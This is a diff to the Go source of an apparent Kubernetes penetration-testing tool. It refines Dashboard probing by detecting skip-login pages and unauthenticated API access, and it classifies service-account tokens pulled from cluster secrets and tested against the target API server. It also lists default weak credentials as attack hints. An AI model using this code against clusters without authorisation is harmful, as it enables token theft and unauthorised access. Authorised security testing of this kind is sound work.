@@ -13,6 +13,7 @@ import (
 	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
 	"github.com/trymonoly/K8sPenTool-ng/internal/util"
 	corev1 "k8s.io/api/core/v1"
+	apierrors "k8s.io/apimachinery/pkg/api/errors"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 )
 
@@ -165,13 +166,13 @@ func (h *DashboardHandler) Discover(c *gin.Context) {
 	exploitHints := h.generateDashboardHints(dashboardServices, dashboardPods)
 
 	c.JSON(http.StatusOK, gin.H{
-		"services":   dashboardServices,
-		"pods":       dashboardPods,
-		"deployments": dashboardDeployments,
-		"ingresses":  dashboardIngresses,
-		"total_svcs":  len(dashboardServices),
-		"total_pods":  len(dashboardPods),
-		"found":      len(dashboardServices) > 0 || len(dashboardPods) > 0,
+		"services":      dashboardServices,
+		"pods":          dashboardPods,
+		"deployments":   dashboardDeployments,
+		"ingresses":     dashboardIngresses,
+		"total_svcs":    len(dashboardServices),
+		"total_pods":    len(dashboardPods),
+		"found":         len(dashboardServices) > 0 || len(dashboardPods) > 0,
 		"exploit_hints": exploitHints,
 	})
 }
@@ -214,9 +215,9 @@ func (h *DashboardHandler) generateDashboardHints(services, pods []gin.H) []gin.
 			"desc":    "某些旧版本 Dashboard (1.7-) 默认允许匿名访问",
 		},
 		gin.H{
-			"step":    5,
-			"title":   "Brute Force / 默认凭据",
-			"desc":    "尝试常见弱密码: admin/admin, kubernetes/admin, admin/password",
+			"step":  5,
+			"title": "Brute Force / 默认凭据",
+			"desc":  "尝试常见弱密码: admin/admin, kubernetes/admin, admin/password",
 		},
 		gin.H{
 			"step":    6,
@@ -273,6 +274,8 @@ func (h *DashboardHandler) Probe(c *gin.Context) {
 
 	results := make([]gin.H, 0)
 	accessible := false
+	skipLoginAvailable := false
+	authBypassPossible := false
 	var accessibleURL, version string
 
 	for _, port := range ports {
@@ -292,8 +295,8 @@ func (h *DashboardHandler) Probe(c *gin.Context) {
 			bodyStr := string(body)
 
 			result := gin.H{
-				"url":         url,
-				"status_code": resp.StatusCode,
+				"url":          url,
+				"status_code":  resp.StatusCode,
 				"content_type": resp.Header.Get("Content-Type"),
 				"body_preview": truncate(bodyStr, 500),
 			}
@@ -319,12 +322,14 @@ func (h *DashboardHandler) Probe(c *gin.Context) {
 				// Check for login skip
 				if path == "/api/v1/" && resp.StatusCode == 200 {
 					result["auth_bypass_possible"] = "Dashboard API accessible without authentication"
+					authBypassPossible = true
 				}
 			}
 
 			// Check for skip-login page
-			if strings.Contains(bodyStr, "skip") || strings.Contains(bodyStr, "Skip") {
+			if detectDashboardSkipLogin(path, bodyStr) {
 				result["skip_login_available"] = true
+				skipLoginAvailable = true
 			}
 
 			results = append(results, result)
@@ -334,23 +339,27 @@ func (h *DashboardHandler) Probe(c *gin.Context) {
 	// Try anonymous access to K8s API through potential API proxy
 	if accessible && strings.Contains(accessibleURL, "/namespaces") {
 		result := gin.H{
-			"accessible":     true,
-			"url":            accessibleURL,
-			"version":        version,
-			"probe_results":  results,
-			"attack_steps":   h.getAttackSteps(req.TargetHost),
+			"accessible":           true,
+			"url":                  accessibleURL,
+			"version":              version,
+			"probe_results":        results,
+			"attack_steps":         h.getAttackSteps(req.TargetHost),
+			"skip_login_available": skipLoginAvailable,
+			"auth_bypass_possible": authBypassPossible,
 		}
 		c.JSON(http.StatusOK, result)
 		return
 	}
 
 	c.JSON(http.StatusOK, gin.H{
-		"accessible":      accessible,
-		"url":             accessibleURL,
-		"version":         version,
-		"probe_results":   results,
-		"attack_steps":    h.getAttackSteps(req.TargetHost),
-		"discovery_count": len(results),
+		"accessible":           accessible,
+		"url":                  accessibleURL,
+		"version":              version,
+		"probe_results":        results,
+		"attack_steps":         h.getAttackSteps(req.TargetHost),
+		"discovery_count":      len(results),
+		"skip_login_available": skipLoginAvailable,
+		"auth_bypass_possible": authBypassPossible,
 	})
 }
 
@@ -423,14 +432,17 @@ func (h *DashboardHandler) ExtractToken(c *gin.Context) {
 
 				// Validate token by testing on API server
 				tokenValid := false
+				tokenStatus := "unverified"
 				testClient, testErr := kubectl.NewClient(
 					fmt.Sprintf("https://%s:6443", targetHost),
 					tokenStr,
 					true,
 				)
-				if testErr == nil {
+				if testErr != nil {
+					tokenStatus = "client_error"
+				} else {
 					_, testErr = testClient.Clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
-					tokenValid = (testErr == nil)
+					tokenValid, tokenStatus = classifyDashboardTokenResult(testErr)
 				}
 
 				tokens = append(tokens, gin.H{
@@ -439,6 +451,7 @@ func (h *DashboardHandler) ExtractToken(c *gin.Context) {
 					"secret_name":  secret.Name,
 					"token":        tokenStr,
 					"token_valid":  tokenValid,
+					"token_status": tokenStatus,
 					"token_length": len(tokenStr),
 					"hint":         "将 Token 粘贴到 Dashboard 登录页面的 Token 输入框",
 				})
@@ -462,6 +475,41 @@ func countValidTokens(tokens []gin.H) int {
 		}
 	}
 	return n
+}
+
+func classifyDashboardTokenResult(err error) (bool, string) {
+	switch {
+	case err == nil:
+		return true, "cluster_api_access"
+	case apierrors.IsForbidden(err):
+		return true, "restricted_rbac"
+	case apierrors.IsUnauthorized(err):
+		return false, "unauthorized"
+	default:
+		return false, "unverified"
+	}
+}
+
+func detectDashboardSkipLogin(path, body string) bool {
+	if path != "/" {
+		return false
+	}
+	body = strings.ToLower(body)
+	markers := []string{
+		"skip login",
+		"skip-login",
+		"enable-skip-login",
+		"skiplogin",
+		"skipLogin",
+		`href="/#/login?skip=true"`,
+		`href='#/login?skip=true'`,
+	}
+	for _, marker := range markers {
+		if strings.Contains(body, strings.ToLower(marker)) {
+			return true
+		}
+	}
+	return false
 }
 
 func truncate(s string, maxLen int) string {
